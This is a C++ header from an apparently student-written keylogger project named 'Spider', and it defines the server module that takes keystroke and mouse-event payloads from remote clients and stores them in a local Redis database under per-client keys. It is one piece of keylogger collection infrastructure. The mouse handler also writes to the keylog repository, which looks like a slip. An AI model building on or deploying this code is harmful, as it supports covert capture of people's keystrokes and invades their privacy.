//
// Created by hippolyteb on 11/8/16.
//

#ifndef SPIDER_SERVER_STORETODBMODULE_HPP
#define SPIDER_SERVER_STORETODBMODULE_HPP

#include <bits/unique_ptr.h>
#include <iostream>
#include "../Interfaces/ISpiderBusinessModule.hpp"
#include "../Interfaces/Event/ISpiderEventListener.hpp"
#include "../SpiderEventManager/SpiderEventListener.hpp"
#include "../SpiderEventManager/SpiderEventEmitter.hpp"
#include "../ProtoEnvelopes/Proto/SpiderKeyloggingPayload.pb.h"
#include "../ProtoEnvelopes/Proto/test.pb.h"
#include "../ProtoEnvelopes/Proto/SpiderMouseEvent.pb.h"
#include "../SpiderDatabaseDriver/SpiderTypedRepositoryDriver.hpp"
#include "../SpiderDatabaseDriver/RedisDriver/RedisDriver.hpp"

class StoreToDBModule : public ISpiderBusinessModule {
    std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>> _eventKeylogListener = std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>>(new SpiderEventListener<SpiderKeyLoggingPayload>());
    std::unique_ptr<ISpiderEventListener<SpiderMouseEvent>> _eventMouseListener = std::unique_ptr<ISpiderEventListener<SpiderMouseEvent>>(new SpiderEventListener<SpiderMouseEvent>());
    std::unique_ptr<ISpiderEventListener<testPayload>> _eventTestListener = std::unique_ptr<ISpiderEventListener<testPayload>>(new SpiderEventListener<testPayload>());
    std::unique_ptr<ISpiderEventEmitter> _eventEmitter = std::unique_ptr<ISpiderEventEmitter>(new SpiderEventEmitter());

    std::unique_ptr<SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>> _keylogRepository = nullptr;
    std::unique_ptr<SpiderTypedRepositoryDriver<SpiderMouseEvent>> _mouselogRepository = nullptr;

private:

public:
    StoreToDBModule() {
        RedisDriver *driver = new RedisDriver();
        driver->Connect("127.0.0.1", 6379, "", "");
        _keylogRepository = std::unique_ptr<SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>>(new SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>(driver));
        driver = new RedisDriver();
        driver->Connect("127.0.0.1", 6379, "", "");
        _mouselogRepository = std::unique_ptr<SpiderTypedRepositoryDriver<SpiderMouseEvent>>(new SpiderTypedRepositoryDriver<SpiderMouseEvent>(driver));


        _eventKeylogListener->Register("SpiderKeyLoggingPayload", [&](std::string clientId, SpiderKeyLoggingPayload &payload) {
            _keylogRepository->PushElement("keylog" + clientId, payload);
        });

        _eventMouseListener->Register("SpiderMouseEvent", [&](std::string clientId, SpiderMouseEvent &payload) {
            _keylogRepository->PushElement("mouselog" + clientId, payload);
        });
    }
};

#endif //SPIDER_SERVER_STORETODBMODULE_HPP
